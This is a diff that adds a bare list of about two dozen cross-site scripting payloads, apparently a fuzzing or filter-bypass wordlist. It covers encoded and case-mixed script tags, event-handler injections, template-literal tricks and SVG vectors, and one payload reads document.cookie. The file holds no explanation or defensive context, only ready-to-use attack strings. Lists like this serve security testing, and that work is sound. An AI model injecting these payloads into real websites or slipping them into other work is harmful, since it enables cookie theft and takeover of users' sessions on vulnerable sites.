@@ -1,0 +1,23 @@
+%3Cscript%3Ealert(1)%3C/script%3E
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<!--><script>alert(1)</script>
+<ScRiPt>alert(1)</sCrIpT>
+%3Cimg%20src=x%20onerror=alert(%22XSS%22)%3E&parentPath=%3Cimg%20src=x%20onerror=alert(%22XSS%22)%3E
+${alert(1)}
+{alert`1`}
+${alert`1`}
+%60%24%7balert%281%29%7d%60
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+`"`>'>`${`{${parent`alert`}``}`}//
+rix4uni`${alert(1)}`
+"><img src=x onerrora=confirm() onerror=confirm(1)>
+'<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+">>>>>><marquee>RXSS</marquee></head><abc></script><script>alert(document.cookie)</script><meta
+<form><input value=alert(1)></form><xss oncontentvisibilityautostatechange=Function?.(document.forms[0].elements[0].value)() popover id=x style=display:block;content-visibility:auto>XSS</xss>
+<sCriPt x>(((confirm)))``</scRipt x>
+<svg xmlns="w3.org/2000/svg"><script>alert('XSS')</script></svg>
+<svg xmlns="w3.org/2000/svg" onload=alert('XSS')></svg>
+<svg xmlns="w3.org/2000/svg"><animate onbegin=alert('XSS') attributeName=x dur=1s></animate></svg>
+<svg xmlns="w3.org/2000/svg"><image href=x onerror=alert('XSS')></image></svg>
+<svg xmlns="w3.org/2000/svg"><foreignObject width="400" height="400"><body xmlns="w3.org"><script>alert('XSS')</script></body></foreignObject></svg>
